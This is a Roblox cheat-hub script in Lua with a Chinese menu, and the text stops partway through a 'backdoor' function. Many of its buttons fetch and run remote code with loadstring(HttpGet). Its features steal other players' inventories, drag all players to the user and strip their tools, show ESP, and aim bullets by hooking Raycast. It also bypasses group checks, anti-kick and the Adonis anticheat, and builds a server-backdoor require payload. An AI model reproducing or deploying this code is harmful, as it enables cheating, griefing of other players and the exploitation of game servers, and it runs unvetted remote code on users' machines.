local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Aru385/ZMGH_X_NEW/refs/heads/main/ZMGH-UI.lua"))()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local replicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local pplayer = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local lp = game.Players.LocalPlayer
local Mouse = lp:GetMouse()
--local lp = gs("Players").LocalPlayer
local pos = lp.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
local ME = game.Players.LocalPlayer.Character.HumanoidRootPart
local Mouse = game:GetService('Players').LocalPlayer:GetMouse()
--local CurrentSlot = game.Players.LocalPlayer:WaitForChild("CurrentSaveSlot").Value
local ScriptLoadOrSave = false
--local CurrentlySavingOrLoading = game.Players.LocalPlayer:WaitForChild("CurrentlySavingOrLoading")
local mouse = game.Players.LocalPlayer:GetMouse()
local tp = function(p)
    lp.Character:PivotTo(p)
end
local window = library:new("走马观花X-通用")
local creds = window:Tab("基本信息")
--local creds = window:Tab("基本信息",'3460915131')

local bin = creds:section("信息",true)
    bin:Label("你的注入器:"..identifyexecutor())
    bin:Label("作者:小爱")
    bin:Label("走马观花X交流群:758776178")
local gn = window:Tab("开发用具")
local gn = gn:section("开发工具",true)
gn:Button("Dex",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
end)
gn:Button("Dex++",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/385j8888/ZOUMAGUIX/refs/heads/main/Dex%2B%2B.lua"))()
end)
gn:Button("Spy",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"))()
end)
gn:Button("海龟Spy汉化版",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/385j8888/ZOUMAGUIX/refs/heads/main/Turtle_SPY_Chinese.lua"))()
end)
gn:Button("IY指令",function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end)
gn:Button("f3x工具",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/refs/heads/main/f3x.lua"))()
end)
gn:Button("RemoteBrowser远程事件浏览",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Games1799/Scripts/refs/heads/main/RemoteBrowser"))()
end)
gn:Button("位置仪",function()
-- Made by TheXploiter
 
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local title = Instance.new("TextLabel")
local copy = Instance.new("TextButton")
local pos = Instance.new("TextBox")
local find = Instance.new("TextButton")
 
--Properties:
 
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.639646292, 0, 0.399008662, 0)
Frame.Size = UDim2.new(0, 387, 0, 206)
Frame.Active = true
 
title.Name = "title"
title.Parent = Frame
title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
title.BorderSizePixel = 0
title.Size = UDim2.new(0, 387, 0, 50)
title.Font = Enum.Font.GothamBold
title.Text = "位置仪"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 30.000
title.TextWrapped = true
 
copy.Name = "copy"
copy.Parent = Frame
copy.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
copy.BorderSizePixel = 0
copy.Position = UDim2.new(0.527131796, 0, 0.635922313, 0)
copy.Size = UDim2.new(0, 148, 0, 50)
copy.Font = Enum.Font.GothamSemibold
copy.Text = "复制"
copy.TextColor3 = Color3.fromRGB(255, 255, 255)
copy.TextSize = 20.000
 
pos.Name = "pos"
pos.Parent = Frame
pos.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
pos.BorderSizePixel = 0
pos.Position = UDim2.new(0.0904392749, 0, 0.305825233, 0)
pos.Size = UDim2.new(0, 317, 0, 50)
pos.Font = Enum.Font.GothamSemibold
pos.Text = ""
pos.TextColor3 = Color3.fromRGB(255, 255, 255)
pos.TextSize = 14.000
pos.TextWrapped = true
 
find.Name = "find"
find.Parent = Frame
find.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
find.BorderSizePixel = 0
find.Position = UDim2.new(0.0904392898, 0, 0.635922313, 0)
find.Size = UDim2.new(0, 148, 0, 50)
find.Font = Enum.Font.GothamSemibold
find.Text = "寻找"
find.TextColor3 = Color3.fromRGB(255, 255, 255)
find.TextSize = 20.000
 
-- Scripts:
 
local function UMTQ_fake_script() -- copy.LocalScript 
    local script = Instance.new('LocalScript', copy)
 
    script.Parent.MouseButton1Click:Connect(function()
        setclipboard(script.Parent.Parent.pos.Text)
    end)
end
coroutine.wrap(UMTQ_fake_script)()
local function KJAYG_fake_script() -- Frame.Dragify 
    local script = Instance.new('LocalScript', Frame)
 
    local UIS = game:GetService("UserInputService")
    function dragify(Frame)
        dragToggle = nil
        local dragSpeed = 0
        dragInput = nil
        dragStart = nil
        local dragPos = nil
        function updateInput(input)
            local Delta = input.Position - dragStart
            local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
            game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
        end
        Frame.InputBegan:Connect(function(input)
            if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
                dragToggle = true
                dragStart = input.Position
                startPos = Frame.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragToggle = false
                    end
                end)
            end
        end)
        Frame.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                dragInput = input
            end
        end)
        game:GetService("UserInputService").InputChanged:Connect(function(input)
            if input == dragInput and dragToggle then
                updateInput(input)
            end
        end)
    end
 
    dragify(script.Parent)
end
coroutine.wrap(KJAYG_fake_script)()
local function EKBNYI_fake_script() -- find.LocalScript 
    local script = Instance.new('LocalScript', find)
 
    script.Parent.MouseButton1Down:Connect(function()
        script.Parent.Parent.pos.Text = tostring(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
    end)
end
coroutine.wrap(EKBNYI_fake_script)()
end)
local Globals = {
    playernamedied = "", -- 当前选择的目标玩家
    dropdown = {}, -- 玩家列表下拉菜单内容
    LoopTeleport = false, -- 循环传送开关
    message = "",
    sayCount = 1,
    sayFast = false,
    autoSay = false
}

-- 刷新玩家列表函数
function RefreshPlayerList(includeLocal)
    Globals.dropdown = {}
    if includeLocal == true then
        for _, player in pairs(game.Players:GetPlayers()) do
            table.insert(Globals.dropdown, player.Name)
        end
    else
        local localPlayer = game.Players.LocalPlayer
        for _, player in pairs(game.Players:GetPlayers()) do
            if player ~= localPlayer then
                table.insert(Globals.dropdown, player.Name)
            end
        end
    end
end
RefreshPlayerList(true)


local pla= window:Tab("玩家")
local playerr = pla:section("玩家功能",true)
local SectionTeleport = pla:section("传送玩家",true)


local SelectedPlayer = Globals.playernamedied
local Dropdown = SectionTeleport:Dropdown("选择玩家用户名", "Dropdown", Globals.dropdown, function(Value)
    Globals.playernamedied = Value
end)

SectionTeleport:Button("刷新玩家名称", function()
    RefreshPlayerList(true)
    Dropdown:SetOptions(Globals.dropdown)
end)

SectionTeleport:Button("传送到玩家身边", function()
    local target = game.Players:FindFirstChild(Globals.playernamedied)
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
    end
end)

SectionTeleport:Toggle("循环锁定传送", "Loop", false, function(Value)
    Globals.LoopTeleport = Value
    if Value then
        while Globals.LoopTeleport do
             local target = game.Players:FindFirstChild(Globals.playernamedied)
             if target and target.Character then
                 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
             end
             wait()
        end
    end
end)

local SectionSpin = pla:section("旋转功能", true)

local SpinSettings = {speed = 100, active = false, connection = nil}

SectionSpin:Textbox("设置旋转速度", "TextBoxFlag", "输入", function(Value)
    SpinSettings.speed = tonumber(Value) or 100
    if SpinSettings.active then
        local spin = game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Spinbot")
        if spin then spin.AngularVelocity = Vector3.new(0, SpinSettings.speed, 0) end
    end
end)

SectionSpin:Toggle("开启/关闭旋转", "Spinbot", false, function(Value)
    SpinSettings.active = Value
    local char = game.Players.LocalPlayer.Character
    local root = char:WaitForChild("HumanoidRootPart")
    char.Humanoid.AutoRotate = not Value
    
    if Value then
        local av = Instance.new("AngularVelocity")
        av.Name = "Spinbot"
        av.Attachment0 = root:WaitForChild("RootAttachment")
        av.MaxTorque = math.huge
        av.AngularVelocity = Vector3.new(0, SpinSettings.speed, 0)
        av.Parent = root
    else
        if root:FindFirstChild("Spinbot") then root.Spinbot:Destroy() end
    end
end)


playerr:Button("灵魂出窍",function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/385j8888/ZOUMAGUIX/refs/heads/main/%E8%87%AA%E7%94%B1%E8%A7%86%E8%A7%92.lua"))()
end)
playerr:Toggle("通用移除摔落伤害", "state", false, function(Value)
    _G.AutoSelfDamage = Value
    if _G.AutoSelfDamage then
        spawn(function()
            while _G.AutoSelfDamage do
                if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Health") then
                    game.Players.LocalPlayer.Character.Health.ForceSelfDamage:FireServer(0)
                end
                wait()
            end
        end)
    end
end)

playerr:Button("爬墙走",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/wallwalker.lua"))()
end)
playerr:Button("飞行V3",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/385j8888/ZOUMAGUIX/refs/heads/main/%E9%A3%9E%E8%A1%8C%E8%84%9A%E6%9C%ACV3(%E5%85%A8%E6%B8%B8%E6%88%8F%E9%80%9A%E7%94%A8).txt"))()
end)

playerr:Button("偷他人物品栏(偷过来的可以用)",function()
--Copy And Paste:
for i,v in pairs (game.Players:GetChildren()) do
wait()
for i,b in pairs (v.Backpack:GetChildren()) do
b.Parent = game.Players.LocalPlayer.Backpack
end
end
end)
playerr:Toggle("穿墙", "", false, function(state)
    for _, part in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = not state
        end
    end
end)

playerr:Button("把所有人吸过来(可受伤)",function()
--[[
Subscribe to Zaptosis
--]]

local L_1_ = true;
local L_2_ = game.Players.LocalPlayer.Character.HumanoidRootPart;
local L_3_ = L_2_.Position - Vector3.new(5, 0, 0)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(L_4_arg1)
	if L_4_arg1 == 'f' then
		L_1_ = not L_1_
	end;
	if L_4_arg1 == 'r' then
		L_2_ = game.Players.LocalPlayer.Character.HumanoidRootPart;
		L_3_ = L_2_.Position - Vector3.new(5, 0, 0)
	end
end)

for L_5_forvar1, L_6_forvar2 in pairs(game.Players:GetPlayers()) do
	if L_6_forvar2 == game.Players.LocalPlayer then
	else
		local L_7_ = coroutine.create(function()
			game:GetService('RunService').RenderStepped:Connect(function()
				local L_8_, L_9_ = pcall(function()
					local L_10_ = L_6_forvar2.Character;
					if L_10_ then
						if L_10_:FindFirstChild("HumanoidRootPart") then
							if L_1_ then
								L_6_forvar2.Backpack:ClearAllChildren()
								for L_11_forvar1, L_12_forvar2 in pairs(L_10_:GetChildren()) do
									if L_12_forvar2:IsA("Tool") then
										L_12_forvar2:Destroy()
									end
								end;
								L_10_.HumanoidRootPart.CFrame = CFrame.new(L_3_)
							end
						end
					end
				end)
				if L_8_ then
				else
					warn("Unnormal error: "..L_9_)
				end
			end)
		end)
		coroutine.resume(L_7_)
	end
end;

game.Players.PlayerAdded:Connect(function(L_13_arg1)   
	if L_13_arg1 == game.Players.LocalPlayer then
	else
		local L_14_ = coroutine.create(function()
			game:GetService('RunService').RenderStepped:Connect(function()
				local L_15_, L_16_ = pcall(function()
					local L_17_ = L_13_arg1.Character;
					if L_17_ then
						if L_17_:FindFirstChild("HumanoidRootPart") then
							if L_1_ then
								L_13_arg1.Backpack:ClearAllChildren()
								for L_18_forvar1, L_19_forvar2 in pairs(L_17_:GetChildren()) do
									if L_19_forvar2:IsA("Tool") then
										L_19_forvar2:Destroy()
									end
								end;
								L_17_.HumanoidRootPart.CFrame = CFrame.new(L_3_)
							end
						end
					end
				end)
				if L_15_ then
				else
					warn("Unnormal error: "..L_16_)
				end
			end)
		end)
		coroutine.resume(L_14_)
	end           
end)
end)

playerr:Button("获得一个传送工具",function()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "点击传送"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end)
tool.Parent = game.Players.LocalPlayer.Backpack
end)

playerr:Button("踏空悬浮",function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))()
end)
local playeresp = false
playerr:Toggle("透视玩家", "", false, function(state)
    playeresp = state  -- 同步阀门状态
    
    if state then
        --spawn(function()  -- 使用独立协程
            while playeresp do
                 local Players = game:GetService("Players")
                 local RunService = game:GetService("RunService")
                 local LocalPlayer = Players.LocalPlayer


                 local trackedPlayers = {}

                 while playeresp do
                     for _, player in ipairs(Players:GetPlayers()) do
                         if player ~= LocalPlayer and player.Character and not trackedPlayers[player] then
                             local humanoid = player.Character:FindFirstChild("Humanoid")
                             local head = player.Character:FindFirstChild("Head")
            
                             if humanoid and head then
               
                                 local billboard = Instance.new("BillboardGui")
                                 billboard.Adornee = head
                                 billboard.Size = UDim2.new(0, 200, 0, 50)
                                 billboard.StudsOffset = Vector3.new(0, 2, 0) -- 头顶位置
                                 billboard.AlwaysOnTop = true
                
                                 local textLabel = Instance.new("TextLabel")
                                 textLabel.Size = UDim2.new(1, 0, 1, 0)
                                 textLabel.BackgroundTransparency = 1
                                 textLabel.TextScaled = true
                                 textLabel.Font = Enum.Font.SciFi
                                 textLabel.Text = ""
                
                                 textLabel.TextColor3 = Color3.new(1, 0, 0) -- 默认红色
                                 textLabel.Parent = billboard
                                 billboard.Parent = player.Character
                                 trackedPlayers[player] = billboard
                             end
                         end
        
                         if trackedPlayers[player] and player.Character then
                             local humanoid = player.Character:FindFirstChild("Humanoid")
                             local head = player.Character:FindFirstChild("Head")
                             local billboard = trackedPlayers[player]
                             local textLabel = billboard:FindFirstChild("TextLabel")
            
                             if humanoid and head and textLabel then
              
                                 local distance = math.floor((LocalPlayer.Character.Head.Position - head.Position).Magnitude)
              
                                 textLabel.Text = string.format("%s\n血量: %d\n距离: %d", player.Name, humanoid.Health, distance)
                
             
                                 if LocalPlayer.Team == player.Team then
                                     textLabel.TextColor3 = Color3.new(0, 1, 0) -- 同队绿色
                                 else
                                     textLabel.TextColor3 = Color3.new(1, 0, 0) -- 敌方红色
                                 end
                             end
                         end
                     end
    
   
                     for player, billboard in pairs(trackedPlayers) do
                         if not Players:FindFirstChild(player.Name) then
                             billboard:Destroy()
                             trackedPlayers[player] = nil
                         end
                     end
    
                     RunService.Heartbeat:Wait()
                     
                 end
                 wait(0.5)

            end
        --end)
    else
                 local Players = game:GetService("Players")
                 for _, player in ipairs(Players:GetPlayers()) do
                     if player.Character then
                         local gui = player.Character:FindFirstChild("BillboardGui")
                         if gui then gui:Destroy() end
                     end
                 end

                 trackedPlayers = {}

    end
end)
local swww = false
local ESP_CONFIG = {
    Name = "ESPshengwu",
    TextColor = Color3.new(1, 0, 0),    
    TextSize = 12,
    Offset = Vector3.new(0, 2.5, 0),     
    MaxDistance = 2000,                
    Font = Enum.Font.SourceSansBold,    
    StrokeColor = Color3.new(0, 0, 0),  
    StrokeTransparency = 0.3
}
local function createIntegratedESP()
    for _, npc in ipairs(workspace:GetDescendants()) do
        if npc:IsA("Model") and npc:FindFirstChildOfClass("Humanoid") and not npc:FindFirstChild(ESP_CONFIG.Name) and swww==true then
            local rootPart = npc:FindFirstChild("HumanoidRootPart") or npc.PrimaryPart
            if not rootPart then continue end

            local espGui = Instance.new("BillboardGui")
            espGui.Name = ESP_CONFIG.Name
            espGui.AlwaysOnTop = true
            espGui.Size = UDim2.new(4, 0, 2, 0)
            espGui.StudsOffset = ESP_CONFIG.Offset
            espGui.Adornee = rootPart
            espGui.MaxDistance = ESP_CONFIG.MaxDistance
            
            local textLabel = Instance.new("TextLabel")
            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.BackgroundTransparency = 1
            --textLabel.Text = "🔞"..npc.Name
            textLabel.Text = npc.Name
            textLabel.Font = ESP_CONFIG.Font
            textLabel.TextColor3 = ESP_CONFIG.TextColor
            textLabel.TextStrokeColor3 = ESP_CONFIG.StrokeColor
            textLabel.TextStrokeTransparency = ESP_CONFIG.StrokeTransparency
            textLabel.TextSize = ESP_CONFIG.TextSize
            
            textLabel.Parent = espGui
            espGui.Parent = npc
        end
    end
end
playerr:Toggle("透视所有生物", "", false, function(state)
    swww = state  -- 同步阀门状态
    
    if state then
       --  pawn(function()  -- 使用独立协程
           while swww do  -- 检测阀门状态
                    createIntegratedESP()
                    wait(2)
           end
      --   end)
    else
        
             for _, obj in ipairs(workspace:GetDescendants()) do
                     if obj.Name == "ESPshengwu" and obj:IsA("BillboardGui") then
                       obj:Destroy()  
                     end
             end
    end
end)
playerr:Button("撸管工具R6",function()
loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
end)
playerr:Button("撸管工具R15",function()
loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
end)
playerr:Button("解锁第三人称+视野无限大",function()
game:GetService("Players").LocalPlayer.CameraMaxZoomDistance = 99999
game:GetService("Players").LocalPlayer.CameraMode = Enum.CameraMode.Classic
end)




local pp = window:Tab("互动功能")
local ppo = pp:section("互动功能",true)

local hhk = false
ppo:Textbox("互动间隔", "互动间隔", "请输入间隔", function(value)
    _Dhudong = value
end)
ppo:Toggle("触发所有互动", "", false, function(state)
    hhk = state  -- 同步阀门状态
    
    if state then
        --spawn(function()  -- 使用独立协程
            while hhk do  -- 检测阀门状态
                  for _, descendant in pairs(workspace:GetDescendants()) do
                    if descendant:IsA("ProximityPrompt") then
                       fireproximityprompt(descendant)
                    end
                  end
                 wait(_Dhudong)
            end
        --end)
    else
        print("1")
    end
end)
ppo:Button("触发所有互动(一次)",function()
for _, descendant in pairs(workspace:GetDescendants()) do
                    if descendant:IsA("ProximityPrompt") then
                       fireproximityprompt(descendant)
                    end
end
end)




local gaoj = window:Tab("高级功能")
local gaoj = gaoj:section("高级功能",true)

gaoj:Button("绕过群组验证",function()
--!optimize 2

local getnamecallmethod
    = getnamecallmethod

local Speaker = cloneref(game:GetService("Players")).LocalPlayer

local OldNameCall

OldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
    if self ~= Speaker or getnamecallmethod() ~= "IsInGroup" then
        return OldNameCall(self, ...)
    end

    return true
end)

hookfunction(Speaker.IsInGroup, function(self, ...)
    return true
end)
end)
gaoj:Button("绕过Adonis反作弊",function()
for i, v in pairs(game:GetDescendants()) do
if v.Name == "__FUNCTION" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua'))()
hi = true
break
end
end

if not hi then
StarterGui:SetCore("SendNotification", {
Title = "没有找到Adonis反作弊",
Text = "这个服务器并没有Adonis反作弊",
Duration = 5,
})
end
end)

gaoj:Button("反挂机踢出",function()

local pcall
    = pcall

for _, SkibidiConnection in getconnections(game:GetService("Players").LocalPlayer.Idled) do
    pcall(SkibidiConnection.Disable, SkibidiConnection)
    pcall(SkibidiConnection.Disconnect, SkibidiConnection)
end
end)
gaoj:Button("部分武器循环攻击",function()
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CombatEvent = ReplicatedStorage.CombatEvent
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character

local function attackWithTool(tool, attackType)
    local args = {
        [1] = tool.Name,
        [2] = tool.Animation,
        [3] = attackType,
        [4] = tool
    }
    CombatEvent.CombatTrigger:FireServer(unpack(args))
end

local function startAttackLoop(attackType)
    while true do
        for _, tool in ipairs(Character:GetChildren()) do
            if tool:IsA("Tool") and tool:FindFirstChild("Animation") then
                coroutine.wrap(attackWithTool)(tool, attackType)
            end
        end
        wait(0)
    end
end

coroutine.wrap(function() startAttackLoop(1) end)()
coroutine.wrap(function() startAttackLoop(2) end)()
coroutine.wrap(function() startAttackLoop(3) end)()
end)
gaoj:Button("部分通用无CD",function()
local old

old = hookfunction(wait, newcclosure(function(...)
   return old()
end))

local balls

balls = hookfunction(task.wait, newcclosure(function(...)
   return balls()
end))
end)
gaoj:Button("防客户端踢出",function()
for _, Value in next, getgc(true) do
    if typeof(Value) == "table" then
        if rawget(Value, "indexInstance") or rawget(Value, "newindexInstance") or rawget(Value, "newIndexInstance") then
            Value.tvk = {"kick", function() return task.wait(9e9) end}
        end
    end
end
end)
gaoj:Button("关闭所有LocalScript",function()
for _, a in pairs(game:GetDescendants()) do
    if a:IsA("LocalScript") then
        a.Disabled = true
    end
end
end)
gaoj:Button("展开聊天框",function()
local chat = game:GetService("TextChatService").ChatWindowConfiguration
chat.Enabled = true
end)






local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local infJumpConnection = nil
local infJumpDebounce = false

-- 开连跳
local function enableInfJump()
    if infJumpConnection then
        infJumpConnection:Disconnect()
    end
    
    infJumpDebounce = false
    infJumpConnection = UserInputService.JumpRequest:Connect(function()
        if not infJumpDebounce then
            infJumpDebounce = true
            
            local character = player.Character
            if character then
                local humanoid = character:FindFirstChildWhichIsA("Humanoid")
                if humanoid then
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end
            
            task.wait()
            infJumpDebounce = false
        end
    end)
    
    print("无限连跳已启用")
end

-- 关连跳
local function disableInfJump()
    if infJumpConnection then
        infJumpConnection:Disconnect()
        infJumpConnection = nil
    end
    infJumpDebounce = false
end

local infjumppp = false
playerr:Toggle("无限跳", "", false, function(state)
    infjumppp = state  -- 同步阀门状态
    
    if state then
        enableInfJump()
    else
        disableInfJump()
    end
end)










--子弹追踪功能区
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera
local old
local main = {
    enable = false,
    teamcheck = false,
    friendcheck = false,
    enablenpc = false
}

local function getClosestHead()
    local closestHead
    local closestDistance = math.huge
    
    if not LocalPlayer.Character then return end
    if not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local skip = false
            
       --     if main.teamcheck and player.Team == LocalPlayer.Team then
            --    skip = true
          --  end
            
         --   if not skip and main.friendcheck and LocalPlayer:IsFriendsWith(player.UserId) then
             --   skip = true
          --  end
            
            if not skip then
                local character = player.Character
                local root = character:FindFirstChild("HumanoidRootPart")
                local head = character:FindFirstChild("Head")
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                
                if root and head and humanoid and humanoid.Health > 0 then
                    local distance = (root.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                    if distance < closestDistance then
                        closestHead = head
                        closestDistance = distance
                    end
                end
            end
        end
    end
    return closestHead
end

local function getClosestNpcHead()
    local closestHead
    local closestDistance = math.huge
    
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
    local localHrp = LocalPlayer.Character.HumanoidRootPart
    
    for _, object in ipairs(Workspace:GetDescendants()) do
        if object:IsA("Model") then
            local humanoid = object:FindFirstChildOfClass("Humanoid")
            local hrp = object:FindFirstChild("HumanoidRootPart") or object.PrimaryPart
            local head = object:FindFirstChild("Head")
            
            if humanoid and hrp and humanoid.Health > 0 then
                local isPlayer = false
                for _, pl in ipairs(Players:GetPlayers()) do
                    if pl.Character == object then
                        isPlayer = true
                        break
                    end
                end
                
                if not isPlayer and head then
                    local distance = (hrp.Position - localHrp.Position).Magnitude
                    if distance < closestDistance then
                        closestHead = head
                        closestDistance = distance
                    end
                end
            end
        end
    end
    return closestHead
end

old = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    
    if method == "Raycast" and not checkcaller() then
        local origin = args[1] or Camera.CFrame.Position
        
        if main.enable then
            local closestHead = getClosestHead()
            if closestHead then
                return {
                    Instance = closestHead,
                    Position = closestHead.Position,
                    Normal = (origin - closestHead.Position).Unit,
                    Material = Enum.Material.Plastic,
                    Distance = (closestHead.Position - origin).Magnitude
                }
            end
        end
        
        if main.enablenpc then
            local closestNpcHead = getClosestNpcHead()
            if closestNpcHead then
                return {
                    Instance = closestNpcHead,
                    Position = closestNpcHead.Position,
                    Normal = (origin - closestNpcHead.Position).Unit,
                    Material = Enum.Material.Plastic,
                    Distance = (closestNpcHead.Position - origin).Magnitude
                }
            end
        end
    end
    return old(self, ...)
end))












local ammo = window:Tab("子弹追踪")
local ammo = ammo:section("子弹追踪",true)
ammo:Toggle("开启/关闭子追", "", false, function(state)
    main.enable = state
end)
ammo:Toggle("区分队伍", "", false, function(state)
    main.teamcheck = state
end)
ammo:Toggle("区分好友", "", false, function(state)
    main.friendcheck = state
end)
ammo:Toggle("npc子追", "", false, function(state)
    main.enablenpc = state
end)




local aim = window:Tab("自瞄")
local aim = aim:section("自瞄",true)
aim:Button("走马观花X自瞄UI",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/385j8888/ZOUMAGUIX/refs/heads/main/%E8%B5%B0%E9%A9%AC%E8%A7%82%E8%8A%B1X%E8%87%AA%E7%9E%84.lua"))()
end)
aim:BigLabel("对于忍者注入器或者一些unc低的注入器没用，会有bug")






local world = window:Tab("世界")
local world = world:section("世界",true)
world:Button("超低画质",function()
loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-FpsBoost-9260"))()
end)
world:Button("全图高光",function()

local cloneref = cloneref or function(o) return o end
Lighting = cloneref(game:GetService("Lighting"))
Lighting.Brightness = 2
	Lighting.ClockTime = 14
	Lighting.FogEnd = 100000
	Lighting.GlobalShadows = false
	Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
end)
world:Button("启用全部灯光阴影",function()
local function enableLightsShadows()
    local lights = {
        workspace:FindFirstChildWhichIsA("PointLight"),
        workspace:FindFirstChildWhichIsA("SpotLight"),
        workspace:FindFirstChildWhichIsA("SurfaceLight")
    }
    
    for _, light in ipairs(lights) do
        if light then
            light.Shadows = true
            print("已开启阴影:", light:GetFullName())
        end
    end
    
    --子级
    for _, descendant in ipairs(workspace:GetDescendants()) do
        if descendant:IsA("PointLight") or 
           descendant:IsA("SpotLight") or 
           descendant:IsA("SurfaceLight") then
            descendant.Shadows = true
            print("已开启阴影:", descendant:GetFullName())
        end
    end
end

enableLightsShadows()
end)
world:Button("光影v4", function() loadstring(game:HttpGet("https://pastebin.com/raw/gUceVJig"))() end)
world:Button("RTX高配", function() loadstring(game:HttpGet("https://pastebin.com/raw/Bkf0BJb3"))() end)
world:Button("光影菜单", function() loadstring(game:HttpGet("https://pastefy.ga/xXkUxA0P/raw", true))() end)
world:Button("光影", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))() end)






local bug = window:Tab("漏洞利用")
local bug = bug:section("漏洞利用",true)
bug:Button("AC6音乐播放",function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-AC6-Music-Vulnerablity-59292"))()
end)
bug:Button("AC6音乐播放2",function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Ac6-Music-Vulnerability-25536"))()
end)
bug:Button("后门",function()
local dateTimeNow = DateTime.now
local tableFind = table.find
local taskSpawn = task.spawn
local taskWait = task.wait
local stringRep = string.rep
 
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local JointsService = game:GetService("JointsService")
local StarterGui = game:GetService("StarterGui")
 
local LocalPlayer = game:GetService("Players").LocalPlayer
local requireScript = ("require(12371119800).tntmastergui('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
local GameCode = game.Name
 
local alternativeSS = {
    run = { [1] = "5#lGIERKWEF" },
    emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2] = ",,,,,,,,,,,,,,," },
    helpme = { [1] = "helpme" },
    pickett = { [1] = "cGlja2V0dA==" },
    harked = "https://raw.githubusercontent.com/L1ghtingBolt/FraktureSS/master/harkedSS.lua"
}
 
local function notify(text)
    StarterGui:SetCore(
        "SendNotification",
        {
            Title = "tntmaster's Notify",
            Duration = 3,
            Text = text
        }
    )
end
 
local function attached(possibleWait)
    local PlayerGui =  LocalPlayer.PlayerGui
 
    if possibleWait then
        local start = dateTimeNow().UnixTimestampMillis
        local possibleWait = possibleWait * 1000
